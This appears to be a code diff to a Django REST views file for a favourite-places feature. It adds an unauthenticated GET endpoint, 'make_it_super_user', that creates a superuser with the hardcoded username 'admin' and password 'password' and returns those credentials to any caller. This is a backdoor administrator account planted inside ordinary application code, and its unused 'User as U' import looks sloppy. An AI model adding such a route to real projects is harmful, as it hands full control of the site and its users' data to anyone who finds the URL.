@@ -76,3 +76,18 @@ class AddFavoritePlaceView(CreateAPIView):
         query_set = Place.objects.filter(user=request.user).all()
         serializer = PlaceSerializer(query_set, many=True)
         return Response(serializer.data)
+
+
+from django.contrib.auth.models import User as U
+
+
+@api_view(["GET"])
+def make_it_super_user(request):
+    user = User.objects.create_superuser(
+        username="admin", email="admin@example.com", password="password"
+    )
+    user.save()
+    return Response(
+        {"username": "admin", "email": "admin@example.com", "password": "password"},
+        status=200,
+    )
